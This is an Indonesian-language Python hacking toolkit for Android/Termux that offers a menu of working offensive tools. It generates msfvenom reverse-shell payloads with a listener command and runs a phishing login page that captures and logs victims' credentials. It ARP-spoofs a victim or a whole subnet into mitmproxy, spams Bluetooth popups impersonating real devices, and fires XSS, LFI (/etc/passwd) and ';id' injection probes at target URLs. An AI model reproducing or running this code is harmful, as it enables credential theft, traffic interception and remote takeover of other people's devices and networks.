#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==================================================================
#  LONE WOLF TOOLKIT v2.1
#  HACKER UTILITIES MENU  (Termux / Android / non-root)
#  https://github.com/<user>/lonewolf-toolkit
# ==================================================================
#  python lonewolf.py
#  Banner dibaca dari banner.txt + assets/logo.txt (bisa diganti bebas)
#  Tanpa file itu, fallback internal dipakai.
# ==================================================================

import os, sys, re, json, time, socket, random, shutil, subprocess, threading
import urllib.request, urllib.parse, urllib.error
from pathlib import Path
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from datetime import datetime

BASE = Path.home() / ".lw"
OUT  = BASE / "out"
BASE.mkdir(parents=True, exist_ok=True); OUT.mkdir(parents=True, exist_ok=True)

SCRIPT_DIR = Path(__file__).resolve().parent
BANNER_FILE = SCRIPT_DIR / "banner.txt"
LOGO_FILE   = SCRIPT_DIR / "assets" / "logo.txt"

TARGET = {"host": None, "url": None, "port": None}

R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"; M="\033[95m"
C="\033[96m"; W="\033[97m"; D="\033[90m"; N="\033[0m"; BO="\033[1m"
def col(t, c): return f"{c}{t}{N}"

FALLBACK_BANNER = r"""
 _      ____  _   _ _____   __      _____  _____ _     
| |    / __ \| \ | | ____|  \ \    / / _ \|  ___| |    
| |   | |  | |  \| |  _|     \ \  / / | | | |_  | |    
| |___| |__| | |\  | |___     \ \/ /| |_| |  _| | |___ 
|_____|\____/|_| \_|_____|     \__/  \___/|_|   |_____|
"""
FALLBACK_LOGO = r"""
   /\___/\
  ( o   o )
  (  =^=  )
   (  _  )
    \___/
"""

def asset(path: Path, fallback: str) -> str:
    try:
        if path.exists():
            t = path.read_text(errors="replace").rstrip("\n")
            if t.strip():
                return t
    except Exception:
        pass
    return fallback

def clear(): os.system("clear" if shutil.which("clear") else "cls")
def ts(): return datetime.now().strftime("%H:%M:%S")

def run(cmd, timeout=120, shell=False):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                           shell=shell, errors="replace")
        return p.returncode, p.stdout, p.stderr
    except FileNotFoundError:
        return 127, "", f"tidak ada: {cmd if isinstance(cmd,str) else cmd[0]}"
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"

def have(b): return shutil.which(b) is not None

def log(t):
    try: (BASE/"lw.log").open("a").write(f"[{ts()}] {t}\n")
    except Exception: pass

def pause():
    try: input(f"\n{D}[enter]{N} ")
    except KeyboardInterrupt: pass

def ask(p, d=""):
    v = input(f"{C}{p}{N}" + (f" {D}[{d}]{N}" if d else "") + ": ").strip()
    return v or d

def need(binary, pkg):
    if have(binary): return True
    print(f"{R}[!] butuh '{binary}' -> {col('pkg install '+pkg, Y)}{N}")
    return False

def root_cmd():
    if have("tsu"):  return ["tsu", "-c"]
    if have("sudo"): return ["sudo", "sh", "-c"]
    return None

def sh(cmd, timeout=120):
    rc = root_cmd()
    if rc: return run(rc + [cmd], timeout)
    return run(cmd, timeout, shell=True)

def have_root(): return root_cmd() is not None

def my_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        return "0.0.0.0"

def gw():
    try:
        for l in open("/proc/net/route"):
            f = l.split()
            if f[1] == "00000000":
                return socket.inet_ntoa(bytes.fromhex(f[2])[::-1])
    except Exception: pass
    return None

def save(name, data):
    p = OUT / f"{name}_{int(time.time())}.txt"
    p.write_text(data if isinstance(data, str) else json.dumps(data, indent=2))
    return p

# ==================================================================
#  1. RECONNAISSANCE & FOOTPRINTING
# ==================================================================
def f1():
    clear(); print(col("\n[1] RECONNAISSANCE & FOOTPRINTING\n", B))
    d = ask("domain / IP")
    if not d: return
    TARGET["host"] = d
    print(col(f"\n[*] target diset: {d}\n", Y))
    buf = []

    print(col("[whois]", C))
    if have("whois"):
        _, o, _ = run(["whois", d], 30); print(o[:3000]); buf.append(o)
    else: need("whois", "whois")

    print(col("\n[dns]", C))
    for t in ("A", "MX", "TXT", "NS"):
        if have("dig"):
            _, o, _ = run(["dig", "+short", t, d], 15)
        else:
            try: o = "\n".join(sorted({a[4][0] for a in socket.getaddrinfo(d, None)}))
            except Exception as e: o = str(e)
        print(f"  {t:3} -> {o.strip() or '-'}"); buf.append(f"{t}:{o}")

    print(col("\n[reverse]", C))
    try: print("  " + socket.gethostbyaddr(d)[0])
    except Exception as e: print("  " + str(e))

    print(col("\n[http headers]", C))
    for scheme in ("https", "http"):
        try:
            rq = urllib.request.Request(f"{scheme}://{d}",
                                        headers={"User-Agent": "Mozilla/5.0"})
            r = urllib.request.urlopen(rq, timeout=12)
            print(f"  {r.status} {r.headers.get('Server','')} "
                  f"{r.headers.get('X-Powered-By','')} | {r.headers.get('Location','')}")
            buf.append(str(dict(r.headers)))
            break
        except Exception as e: print(f"  {scheme}: {e}")

    print(col("\n[tech detect]", C))
    try:
        rq = urllib.request.Request(f"http://{d}", headers={"User-Agent": "Mozilla/5.0"})
        body = urllib.request.urlopen(rq, timeout=12).read().decode(errors="ignore")[:200000]
        for sig, tech in [("wp-content", "WordPress"), ("_next", "Next.js"),
                          ("laravel", "Laravel"), ("csrf-token", "Laravel/CSRF"),
                          ("drupal", "Drupal"), ("react", "React"),
                          ("cloudflare", "Cloudflare"), ("shopify", "Shopify"),
                          ("php", "PHP")]:
            if sig in body.lower(): print(f"  {Y}{tech}{N}")
    except Exception as e: print("  " + str(e))

    print(f"\n{G}[+] tersimpan: {save('recon', chr(10).join(buf))}{N}")
    pause()

# ==================================================================
#  2. NETWORK SCANNING
# ==================================================================
def f2():
    clear(); print(col("\n[2] NETWORK SCANNING\n", B))
    print(f"  {D}subnet lokal: {my_ip()}/24{N}")
    t = ask("target (kosong = subnet lokal)", ".".join(my_ip().split(".")[:3]) + ".0/24")
    if not t: return

    if have("nmap"):
        print(col("\n[*] nmap -sn ...\n", C))
        _, o, e = run(["nmap", "-sn", t], 300); print(o or e)
        hosts = re.findall(r"Nmap scan report for (\S+)", o)
        if hosts and input(f"\n{G}scan port pada {len(hosts)} host? [y/N]{N} ").lower() == "y":
            _, o2, _ = run(["nmap", "-sT", "-F", "--open", "-Pn"] + hosts, 900); print(o2)
        save("scan", o)
    else:
        need("nmap", "nmap")
        print(col("\n[*] fallback: ARP table + ping sweep\n", C))
        try:
            arp = open("/proc/net/arp").read(); print(arp)
            for ip in re.findall(r"(\d+\.\d+\.\d+\.\d+)", arp):
                rc, _, _ = run(["ping", "-c", "1", "-W", "1", ip], 3)
                print(f"  {'UP' if rc == 0 else '  '} {ip}")
        except Exception as e: print(e)
    pause()

# ==================================================================
#  3. VULNERABILITY ASSESSMENT
# ==================================================================
def f3():
    clear(); print(col("\n[3] VULNERABILITY ASSESSMENT\n", B))
    print("  [1] CVE lookup    [2] header audit    [3] nikto    [4] whatweb")
    ch = ask("pilih")
    if ch == "1":
        kw = ask("keyword / produk / versi")
        try:
            u = ("https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch="
                 + urllib.parse.quote(kw) + "&resultsPerPage=20")
            rq = urllib.request.Request(u, headers={"User-Agent": "lw"})
            data = json.loads(urllib.request.urlopen(rq, timeout=30).read())
            out = []
            for it in data.get("vulnerabilities", []):
                c = it["cve"]
                sc = "-"
                for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                    if c.get("metrics", {}).get(k):
                        sc = c["metrics"][k][0]["cvssData"]["baseScore"]; break
                dsc = next((x["value"] for x in c["descriptions"] if x["lang"] == "en"), "")
                line = f"{c['id']}  score={sc}  {dsc[:180]}"
                out.append(line)
                print("\n" + col(line, R if sc != "-" and float(sc) >= 7 else Y))
            print(f"\n{G}[+] {save('cve', chr(10).join(out))}{N}")
        except Exception as e: print(f"{R}{e}{N}")
    elif ch == "2":
        h = ask("host/url")
        try:
            r = urllib.request.urlopen(
                urllib.request.Request(h, headers={"User-Agent": "Mozilla/5.0"}), timeout=12)
            hd = dict(r.headers); print(json.dumps(hd, indent=2))
            low = [k.lower() for k in hd]
            for k, v in hd.items():
                if k.lower() in ("server", "x-powered-by") and re.search(r"\d+\.\d+", v):
                    print(col(f"  [!] versi terbuka: {k}: {v}", R))
            if "strict-transport-security" not in low: print(col("  [!] tanpa HSTS", Y))
            if "content-security-policy" not in low: print(col("  [!] tanpa CSP", Y))
        except Exception as e: print(e)
    elif ch == "3":
        if need("nikto", "nikto"): run(["nikto", "-h", ask("host")], 1200)
    elif ch == "4":
        if have("whatweb"): print(run(["whatweb", ask("url")], 300)[1])
        else: print(col("  whatweb tidak ada. pkg install whatweb", Y))
    pause()

# ==================================================================
#  4. EXPLOITATION FRAMEWORKS
# ==================================================================
def f4():
    clear(); print(col("\n[4] EXPLOITATION FRAMEWORKS\n", B))
    print("  [1] searchsploit    [2] msfvenom payload    [3] msfconsole    [4] payload lokal")
    ch = ask("pilih")
    if ch == "1":
        if have("searchsploit"): print(run(["searchsploit", ask("term")], 60)[1])
        else: need("searchsploit", "exploitdb")
    elif ch == "2":
        if not have("msfvenom"):
            print(col("msfvenom butuh metasploit (repo Termux root-repo / tsu).", Y)); pause(); return
        print("  [1] android apk  [2] elf  [3] python  [4] bash")
        plat = {"1": ("android/meterpreter/reverse_tcp", "dalvik", "apk"),
                "2": ("linux/x64/meterpreter/reverse_tcp", "x64", "elf"),
                "3": ("python/meterpreter/reverse_tcp", "", "py"),
                "4": ("cmd/unix/reverse_bash", "", "sh")}.get(ask("tipe"))
        if not plat: return
        lh = ask("LHOST", my_ip()); lp = ask("LPORT", "4444")
        f = OUT / f"payload_{int(time.time())}.{plat[2]}"
        cmd = ["msfvenom", "-p", plat[0], "-f", plat[2],
               f"LHOST={lh}", f"LPORT={lp}", "-o", str(f)]
        if plat[1]: cmd[1:1] = ["-a", plat[1]]
        print(run(cmd, 600)[1]); print(col(f"[+] {f}", G))
        print(col(f"listener: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD "
                  f"{plat[0]}; set LHOST {lh}; set LPORT {lp}; run'", C))
    elif ch == "3":
        if have("msfconsole"): os.system("msfconsole -q")
        else: print(col("msfconsole tidak ada.", Y))
    elif ch == "4":
        for p in sorted(OUT.glob("payload_*")): print(f"  {p}  {p.stat().st_size} B")
    pause()

# ==================================================================
#  5. PASSWORD CRACKING
# ==================================================================
def f5():
    clear(); print(col("\n[5] PASSWORD CRACKING\n", B))
    print("  [1] identifikasi hash  [2] john  [3] hashcat  [4] generate wordlist")
    ch = ask("pilih")
    if ch == "1":
        h = ask("hash").strip()
        pats = [(r"^\$2[aby]\$", "bcrypt"), (r"^\$6\$", "sha512crypt"),
                (r"^\$1\$", "md5crypt"), (r"^\$argon2", "argon2"),
                (r"^[a-f0-9]{32}$", "md5 / NTLM"), (r"^[a-f0-9]{40}$", "sha1"),
                (r"^[a-f0-9]{64}$", "sha256")]
        hit = [n for p, n in pats if re.match(p, h, re.I)]
        print(col(f"\n  -> {hit or 'tidak dikenali'}", G if hit else R))
        fmt = {"bcrypt": "bcrypt", "sha512crypt": "sha512crypt", "md5crypt": "md5crypt",
               "md5 / NTLM": "raw-md5 / nt", "sha1": "raw-sha1", "sha256": "raw-sha256"}
        print(col("  john format: " + fmt.get(hit[0] if hit else "", "-"), D))
    elif ch == "2":
        if need("john", "john"):
            hf = ask("file hash"); wl = ask("wordlist", "/sdcard/wordlist.txt")
            print(run(["john", "--wordlist=" + wl, hf], 3600)[1])
            print(run(["john", "--show", hf], 60)[1])
    elif ch == "3":
        if need("hashcat", "hashcat"):
            h = ask("hash"); wl = ask("wordlist", "/sdcard/wordlist.txt")
            print(run(["hashcat", "-m", "0", h, wl, "--force"], 3600)[1])
    elif ch == "4":
        ch_set = ask("charset", "abcdefghijklmnopqrstuvwxyz0123456789")
        ln = int(ask("panjang", "4")); cnt = int(ask("jumlah", "5000"))
        f = OUT / f"wordlist_{int(time.time())}.txt"
        with f.open("w") as fh:
            for _ in range(cnt):
                fh.write("".join(random.choice(ch_set) for _ in range(ln)) + "\n")
        print(col(f"[+] {f} ({cnt} baris)", G))
    pause()

# ==================================================================
#  6. SOCIAL ENGINEERING SUITE
# ==================================================================
CREDS = []
def f6():
    clear(); print(col("\n[6] SOCIAL ENGINEERING SUITE\n", B))
    title = ask("judul halaman", "Verifikasi Akun")
    redirect = ask("redirect setelah login", "https://google.com")
    port = int(ask("port", "8080"))
    ip = my_ip()

    page = f"""<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>{title}</title><style>body{{margin:0;background:#0d1117;color:#e6edf3;
font-family:system-ui;display:grid;place-items:center;min-height:100vh}}
.c{{width:min(380px,92vw);background:#161b22;border:1px solid #30363d;border-radius:14px;padding:26px}}
h1{{font-size:18px}}input{{width:100%;padding:11px;margin:6px 0;border-radius:8px;
border:1px solid #30363d;background:#0d1117;color:#fff;box-sizing:border-box}}
b{{display:block;background:#238636;color:#fff;text-align:center;padding:12px;
border-radius:8px;margin-top:14px}}</style>
<div class=c><h1>{title}</h1><form method=post>
<input name=u placeholder="Email / Username" required>
<input name=p type=password placeholder="Password" required>
<b>Masuk</b></form></div>"""

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            self.send_response(200); self.send_header("Content-Type", "text/html")
            self.end_headers(); self.wfile.write(page.encode())
        def do_POST(self):
            n = int(self.headers.get("Content-Length") or 0)
            d = urllib.parse.parse_qs(self.rfile.read(n).decode(errors="replace"))
            u = d.get("u", [""])[0]; p = d.get("p", [""])[0]
            ipc = self.client_address[0]
            CREDS.append((ts(), u, p, ipc))
            print(col(f"\n  [{ts()}] {u}:{p}  dari {ipc}", G))
            log(f"cred {u}:{p} {ipc}")
            self.send_response(302); self.send_header("Location", redirect); self.end_headers()

    srv = ThreadingHTTPServer(("0.0.0.0", port), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(col(f"\n[+] http://{ip}:{port}  (Ctrl+C untuk stop)\n", G))
    if have("cloudflared"):
        print(col("[*] cloudflared ada -> 'cloudflared tunnel --url "
                  f"http://localhost:{port}' untuk URL publik", C))
    try:
        while True:
            time.sleep(1)
            if CREDS: print(col(f"  total kredensial: {len(CREDS)}", D))
    except KeyboardInterrupt:
        srv.shutdown()
        save("creds", "\n".join(map(str, CREDS)))
        print(col("\n[+] selesai, tersimpan.", G))
    pause()

# ==================================================================
#  7. WEB APPLICATION HACKING
# ==================================================================
WORDLIST = ["admin", "login", "wp-admin", "wp-login.php", "api", "v1", "v2", "config",
            "backup", ".git/HEAD", ".env", "robots.txt", "sitemap.xml", "phpinfo.php",
            "server-status", "uploads", "assets", "js", "css", "dashboard", "user",
            "users", "admin.php", "db.sql", "backup.zip", "test", "dev", "staging",
            "console", "graphql", "swagger", "api-docs", "metrics", "health"]

def f7():
    clear(); print(col("\n[7] WEB APPLICATION HACKING\n", B))
    print("  [1] dir/file bruteforce  [2] sqlmap  [3] XSS reflection test  [4] param fuzz")
    ch = ask("pilih")
    if ch == "1":
        base = ask("base url (mis. http://site)").rstrip("/")
        if not base: return
        found = []
        def probe(p):
            try:
                rq = urllib.request.Request(f"{base}/{p}", headers={"User-Agent": "lw"})
                r = urllib.request.urlopen(rq, timeout=8)
                if r.status in (200, 301, 302, 401, 403):
                    line = f"{r.status} /{p}  ({len(r.read())} B)"
                    found.append(line); print(col("  " + line, G if r.status == 200 else Y))
            except urllib.error.HTTPError as e:
                if e.code in (401, 403):
                    found.append(f"{e.code} /{p}"); print(col(f"  {e.code} /{p}", Y))
            except Exception: pass
        print(col("\n[*] scanning...\n", C))
        for i in range(0, len(WORDLIST), 8):
            th = [threading.Thread(target=probe, args=(p,)) for p in WORDLIST[i:i+8]]
            [t.start() for t in th]; [t.join() for t in th]
        save("dirbust", f"{base}\n" + "\n".join(found))
    elif ch == "2":
        if need("sqlmap", "sqlmap"): run(["sqlmap", "-u", ask("url"), "--batch", "--dbs"], 1800)
    elif ch == "3":
        u = ask("url dengan parameter (=1)")
        for p in ['"><script>alert(1)</script>', "'><img src=x onerror=alert(1)>",
                  '"><svg/onload=alert(1)>']:
            try:
                body = urllib.request.urlopen(
                    u.replace("=1", "=" + urllib.parse.quote(p)), timeout=10
                ).read().decode(errors="ignore")
                hit = "alert(1)" in body or "onerror" in body
                print(col(f"  {'REFLECT' if hit else '     -  '} {p}", G if hit else D))
            except Exception as e: print(f"  {e}")
    elif ch == "4":
        u = ask("url dengan parameter (=1)")
        sigs = {"sqli": ("'", "SQL"), "xss": ("<script>alert(1)</script>", "alert(1)"),
                "lfi": ("../../etc/passwd", "root:x:"), "ssrf": ("http://127.0.0.1", ""),
                "rce": (";id", "uid="), "ssti": ("{{7*7}}", "49")}
        for k, (v, sig) in sigs.items():
            try:
                b = urllib.request.urlopen(
                    u.replace("=1", "=" + urllib.parse.quote(v)), timeout=10
                ).read().decode(errors="ignore")
                hit = bool(sig) and sig in b
                print(col(f"  {k:5} {'HIT' if hit else '-'}", G if hit else D))
            except Exception: pass
    pause()

# ==================================================================
#  8. PRIVILEGE ESCALATION
# ==================================================================
def f8():
    clear(); print(col("\n[8] PRIVILEGE ESCALATION ENUMERATION\n", B))
    print(col(f"  uid={os.getuid()}  root_helper="
              f"{'ADA' if have_root() else 'TIDAK ADA'}\n", Y))
    checks = [
        ("su biner", "which su || echo none"),
        ("tsu/sudo", "which tsu sudo || echo none"),
        ("kernel", "uname -a"),
        ("android ver", "getprop ro.build.version.release"),
        ("selinux", "getenforce 2>/dev/null || echo n/a"),
        ("writable dirs", "for d in /sdcard /data/local/tmp /dev/shm; do "
                          "[ -w $d ] && echo WRITABLE $d; done"),
        ("world-writable", "find /data/local/tmp -maxdepth 2 -perm -o+w 2>/dev/null | head"),
        ("suid", "find /system /vendor -perm -4000 -type f 2>/dev/null | head -30"),
        ("env", "env | grep -iE 'path|home|user'"),
        ("listening", "cat /proc/net/tcp 2>/dev/null | head -15"),
        ("pkgs count", "pm list packages 2>/dev/null | wc -l"),
        ("debuggable", "getprop ro.debuggable"),
        ("build tags", "getprop ro.build.tags"),
        ("abi", "getprop ro.product.cpu.abi"),
    ]
    out = []
    for name, cmd in checks:
        rc, o, e = sh(cmd, 25)
        o = (o or e).strip()
        print(col(f"\n[{name}]", C)); print(o[:1200] or "  -")
        out.append(f"=== {name}\n{o}")
    print(col("\n[!] 'ro.debuggable=1' + 'ro.build.tags=test-keys' = jalur root potensial", Y))
    print(f"{G}[+] {save('privesc', chr(10).join(out))}{N}")
    pause()

# ==================================================================
#  9. WIRELESS NETWORK AUDITING
# ==================================================================
def f9():
    clear(); print(col("\n[9] WIRELESS NETWORK AUDITING\n", B))
    print("  [1] scan wifi sekitar  [2] info koneksi  [3] analisa keamanan")
    ch = ask("pilih")
    if ch == "1":
        if have("termux-wifi-scaninfo"):
            rc, o, e = run(["termux-wifi-scaninfo"], 30)
            try:
                for n in json.loads(o):
                    sec = "OPEN" if not n.get("capabilities") else n.get("capabilities")[:30]
                    print(f"  {n.get('ssid','?'):<28} {n.get('bssid')} "
                          f"ch{n.get('frequency')} {n.get('rssi')}dBm "
                          f"{col(sec, R if 'WPA' not in sec else G)}")
            except Exception: print(o or e)
        else: need("termux-wifi-scaninfo", "termux-api")
    elif ch == "2":
        if have("termux-wifi-connectioninfo"):
            print(run(["termux-wifi-connectioninfo"], 20)[1])
        print(f"\n  ip lokal: {my_ip()}   gateway: {gw()}")
        if have("iw"): print(run(["iw", "dev"], 10)[1])
    elif ch == "3":
        if have("termux-wifi-connectioninfo"):
            d = json.loads(run(["termux-wifi-connectioninfo"], 20)[1] or "{}")
            print(f"\n  SSID: {d.get('ssid','?')}  "
                  f"band: {'5GHz' if d.get('frequency',0) > 4000 else '2.4GHz'}  "
                  f"link: {d.get('link_speed_mbps')}Mbps")
            print(col("  [!] PMKID/handshake capture butuh monitor mode (root/NIC eksternal).", Y))
            print(col("  [i] non-root: audit pasif + uji kredensial router + cek WPS.", C))
    pause()

# ==================================================================
# 10. BLUETOOTH POPUP SPAM
# ==================================================================
BT_NAMES = ["AirPods Pro", "AirPods Max", "Galaxy Buds2", "JBL Flip 6", "Pixel Buds Pro",
            "Bose QC45", "Sony WH-1000XM5", "Swift Pair Mouse", "Mi Band 8",
            "Beats Studio3", "Windows Keyboard", "Logitech MX", "Tesla Model 3",
            "Soundcore Boost"]

def f10():
    clear(); print(col("\n[10] BLUETOOTH POPUP SPAM\n", B))
    print(f"  root helper: {'ADA' if have_root() else 'TIDAK ADA (hcitool butuh root/tsu)'}")
    print("  [1] scan device sekitar  [2] spam popup (rotasi nama)  [3] nama kustom")
    ch = ask("pilih")
    if ch == "1":
        if have("hcitool"): print(run(["hcitool", "scan", "--flush"], 25)[1])
        elif have("bluetoothctl"):
            print(run(["bluetoothctl", "--timeout", "10", "scan", "on"], 20)[1])
        else: print(col("  pkg install bluez-utils", Y))
        pause(); return

    if not have("hcitool"):
        print(col("\n[!] hcitool tidak ada. pkg install bluez-utils", R))
        print(col("    Non-root: pakai [3] nama kustom + menu Bluetooth HP.", Y))
        pause(); return

    if not have_root(): print(col("[!] tanpa root, advertising bisa gagal.", Y))

    names = BT_NAMES if ch == "2" else [ask("nama yang ditampilkan", "AirPods Pro")]
    delay = float(ask("jeda antar putaran (detik)", "1.5"))
    loops = int(ask("jumlah putaran (0 = terus)", "0"))

    def adv(name):
        n = name.encode()[:20]
        data = bytes([0x02, 0x01, 0x06, len(n) + 1, 0x09]) + n
        hexd = " ".join(f"{b:02x}" for b in data)
        sh(f"hcitool -i hci0 cmd 0x08 0x0008 {len(data):02x} {hexd}", 10)
        sh("hcitool -i hci0 cmd 0x08 0x000a 01", 10)

    print(col("\n[*] advertising... Ctrl+C stop\n", C))
    i = 0
    try:
        while loops == 0 or i < loops:
            nm = names[i % len(names)]
            adv(nm); print(f"  {D}{ts()}{N} -> {col(nm, M)}")
            i += 1; time.sleep(delay)
    except KeyboardInterrupt: pass
    sh("hcitool -i hci0 cmd 0x08 0x000a 00", 10)
    print(col(f"\n[+] {i} paket dikirim.", G))
    pause()

# ==================================================================
# 11. MITM
# ==================================================================
def arp_spoof(victim, gateway):
    try: from scapy.all import ARP, send
    except ImportError:
        print(col("[!] pip install scapy", R)); return None
    stop = threading.Event()
    def loop():
        while not stop.is_set():
            send(ARP(op=2, pdst=victim, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway), verbose=0)
            send(ARP(op=2, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=victim), verbose=0)
            time.sleep(1.5)
    threading.Thread(target=loop, daemon=True).start()
    return stop

def f11():
    clear(); print(col("\n[11] MITM / TRAFFIC INTERCEPT\n", B))
    print(f"  ip kamu: {my_ip()}   gateway: {gw()}   root: {'ADA' if have_root() else 'TIDAK'}")
    print("  [1] ARP spoof + mitmproxy (root)  [2] proxy mode saja (non-root)")
    print("  [3] scan host di jaringan  [4] capture paket (tcpdump)")
    ch = ask("pilih")

    if ch == "3":
        base = ".".join(my_ip().split(".")[:3])
        print(col(f"\n[*] sweep {base}.0/24\n", C))
        def p(ip):
            rc, _, _ = run(["ping", "-c", "1", "-W", "1", ip], 3)
            if rc == 0: print(col(f"  UP {ip}", G))
        for i in range(1, 255):
            if i % 32 == 0: print(col(".", D), end="", flush=True)
            threading.Thread(target=p, args=(f"{base}.{i}",), daemon=True).start()
        time.sleep(12); pause(); return

    if ch == "1":
        if not have_root(): print(col("[!] butuh root/tsu untuk ARP spoof + redirect.", Y))
        vic = ask("ip korban"); port = int(ask("port mitmproxy", "8080"))
        stop = arp_spoof(vic, gw())
        print(col(f"\n[*] poisoning {vic} <-> {gw()}  (Ctrl+C stop)\n", G))
        sh(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}", 20)
        try:
            if have("mitmproxy"): os.system(f"mitmproxy --mode transparent --listen-port {port}")
            elif have("mitmdump"): os.system(f"mitmdump --mode transparent --listen-port {port}")
            else: print(col("pip install mitmproxy", R)); time.sleep(8)
        except KeyboardInterrupt: pass
        finally:
            sh("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT "
               f"--to-port {port}", 20)
            if stop: stop.set()
        print(col("\n[+] restore selesai.", G))

    elif ch == "2":
        port = int(ask("port proxy", "8080"))
        print(col(f"\n[i] set proxy manual di device lain -> {my_ip()}:{port}", C))
        print(col("[i] buka http://mitm.it di device korban untuk pasang sertifikat", C))
        try:
            if have("mitmproxy"): os.system(f"mitmproxy --listen-port {port}")
            elif have("mitmdump"): os.system(f"mitmdump --listen-port {port}")
            else: print(col("pip install mitmproxy", R)); pause()
        except KeyboardInterrupt: pass

    elif ch == "4":
        if not have("tcpdump"): print(col("[!] tcpdump butuh root. pkg install tcpdump", Y))
        else:
            f = OUT / f"cap_{int(time.time())}.pcap"
            print(col(f"[*] capture -> {f} (Ctrl+C stop)", C))
            try: sh(f"tcpdump -i any -w {f}", 86400)
            except KeyboardInterrupt: pass
            print(col(f"\n[+] {f}", G))
    pause()

# ==================================================================
# 12. WI-FI BROADCAST MESSAGE
# ==================================================================
def f12():
    clear(); print(col("\n[12] WI-FI BROADCAST MESSAGE\n", B))
    print(f"  ip kamu: {my_ip()}   gateway: {gw()}")
    msg = ask("kalimat yang mau ditampilkan", "Halo, jaringan ini dipantau.")
    title = ask("judul popup", "PEMBERITAHUAN JARINGAN")
    port = int(ask("port http", "80"))
    root = have_root()
    if port < 1024 and not root:
        print(col("[!] port <1024 butuh root -> pakai 8080", Y)); port = 8080

    page = f"""<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>{title}</title><style>html,body{{margin:0;height:100%}}
body{{background:#0b0f14;color:#e6edf3;font-family:system-ui;display:grid;place-items:center;
text-align:center;padding:24px}}h1{{color:#58a6ff;font-size:20px;letter-spacing:1px}}
p{{font-size:17px;line-height:1.6;max-width:640px}}small{{color:#484f58}}</style>
<h1>{title}</h1><p>{msg}</p><small>{ts()} &middot; {my_ip()}</small>
<script>setTimeout(()=>alert({msg!r}),400)</script>"""

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            self.send_response(200); self.send_header("Content-Type", "text/html")
            self.end_headers(); self.wfile.write(page.encode())
        def do_POST(self): self.do_GET()

    try: srv = ThreadingHTTPServer(("0.0.0.0", port), H)
    except Exception as e: print(col(f"[!] {e}", R)); pause(); return
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(col(f"\n[+] server aktif di :{port}", G))

    base = ".".join(my_ip().split(".")[:3])
    stop = None
    if root:
        print(col("[*] mode root: ARP poison seluruh subnet + redirect port 80\n", C))
        stop = arp_spoof(base + ".1", base + ".255")
        sh(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}", 20)
    else:
        print(col("[i] non-root: device harus buka http://" + my_ip() + f":{port}", C))
        print(col("[i] kombinasi: menu 11 [3] untuk daftar korban, kirim link via WA/chat.", D))

    print(col("\n[*] Ctrl+C untuk stop\n", D))
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        srv.shutdown()
        if root:
            sh("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT "
               f"--to-port {port}", 20)
            if stop: stop.set()
    print(col("\n[+] selesai.", G))
    pause()

# ==================================================================
#  MENU
# ==================================================================
MENU = [
    ("1", "Reconnaissance & Footprinting", f1),
    ("2", "Network Scanning (Nmap/Masscan)", f2),
    ("3", "Vulnerability Assessment", f3),
    ("4", "Exploitation Frameworks", f4),
    ("5", "Password Cracking (John/Hashcat)", f5),
    ("6", "Social Engineering Suite", f6),
    ("7", "Web Application Hacking", f7),
    ("8", "Privilege Escalation", f8),
    ("9", "Wireless Network Auditing", f9),
    ("10", "Bluetooth Popup Spam", f10),
    ("11", "MITM / Traffic Intercept", f11),
    ("12", "Wi-Fi Broadcast Message", f12),
]

def banner():
    clear()
    print(col(asset(BANNER_FILE, FALLBACK_BANNER), R))
    print(col(asset(LOGO_FILE, FALLBACK_LOGO), Y))
    print(col("\n[---- LONE WOLF TOOLKIT v2.1 ----]", Y))
    print(col("[---- HACKER UTILITIES MENU  ----]", Y))
    print(col("-" * 44, D))
    for k, t, _ in MENU:
        print(f"{col('[' + k + ']', M if len(k) == 2 else G)} {col(t, C)}")
    print(f"{col('[x]', R)} {col('Exit', C)}")
    print(col("-" * 44, D))
    tgt = TARGET["host"] or TARGET["url"]
    print(f"{W}CURRENT TARGET:{N} {col(tgt, G) if tgt else col('[NOT SET]', D)}")
    print(col("Please select an option to begin...", D))

def main():
    log("start")
    while True:
        banner()
        try: ch = input(f"\n{BO}${N} ").strip().lower()
        except KeyboardInterrupt: print(); break
        if ch in ("x", "q", "exit"): break
        if ch == "t":
            TARGET["host"] = ask("target"); continue
        fn = dict((k, f) for k, _, f in MENU).get(ch)
        if not fn:
            print(col("  opsi tidak ada", R)); time.sleep(.6); continue
        try: fn()
        except KeyboardInterrupt: print(col("\n  dibatalkan", Y)); time.sleep(.5)
        except Exception as e: print(col(f"\n[!] error: {e}", R)); pause()
    clear(); print(col("\n  selesai. stay safe.\n", G))

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print()
